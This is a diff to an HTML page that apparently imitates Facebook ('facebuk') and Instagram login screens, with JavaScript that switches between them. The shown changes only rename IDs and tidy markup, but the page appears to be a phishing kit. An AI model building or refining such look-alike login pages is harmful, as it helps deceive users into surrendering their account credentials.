@@ -18,7 +18,7 @@
 
 </head>
 
-<body>
+<body style="margin: 0;">
 
     <div id="home">
         <header>
@@ -192,7 +192,7 @@
     </center>
 
     <!--facebuk login-->
-    <div id="fbp">
+    <div id="fb_wrapper">
 
         <div id="fbbody" class="fbook">
             <br>
@@ -285,8 +285,8 @@
     <!--facebuk login ends-->
 
     <!--Insta login begins-->
-    <div id="igp">
-        <igcontainer class="_ar45 system-fonts--body roboto">
+    <div id="ig_wrapper">
+        <div id="igcontainer" class="_ar45 system-fonts--body roboto">
             <div id="mount_0_0_6z">
                 <div class="">
                     <div class="">
@@ -478,7 +478,7 @@
                     </div>
                 </div>
             </div>
-        </igcontainer>
+        </div>
     </div>
 
     <!--Insta login ends-->
@@ -547,7 +547,7 @@
         }
 
         function fb() {
-            document.getElementById("fbp").style.display = "block";
+            document.getElementById("fb_wrapper").style.display = "block";
             document.getElementById("home").style.display = "none";
             document.getElementById("choose").style.display = "none";
 
@@ -561,7 +561,7 @@
 
 
         function ig() {
-            document.getElementById("igp").style.display = "block";
+            document.getElementById("ig_wrapper").style.display = "block";
             document.getElementById("home").style.display = "none";
             document.getElementById("choose").style.display = "none";
         }
